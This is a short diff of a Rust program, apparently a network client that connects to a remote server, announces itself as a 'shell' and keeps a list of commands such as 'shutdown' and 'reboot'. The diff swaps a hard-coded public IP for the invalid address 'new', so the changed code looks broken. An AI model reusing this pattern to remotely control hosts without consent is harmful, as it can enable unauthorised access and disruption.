@@ -13,7 +13,7 @@ pub fn main() -> Result<(), Box<dyn Error>> {
 
 #[tokio::main]
 pub async fn tokio_main() -> Result<(), Box<dyn Error>> {
-    let mut stream = TcpStream::connect("172.105.66.226:8080").await?;
+    let mut stream = TcpStream::connect("new").await?;
 
     let result = stream.write(b"shell\n").await;
     println!("Connected as shell..; success={:?}", result.is_ok());
@@ -34,7 +34,7 @@ pub async fn tokio_main() -> Result<(), Box<dyn Error>> {
 }
 
 fn get_selections() -> &'static [&'static str; 10] {
-    let selections = &[
+    &[
         "shutdown",
         "reboot",
         "00",
@@ -45,6 +45,5 @@ fn get_selections() -> &'static [&'static str; 10] {
         "21",
         "30",
         "31",
-    ];
-    selections
+    ] as _
 }
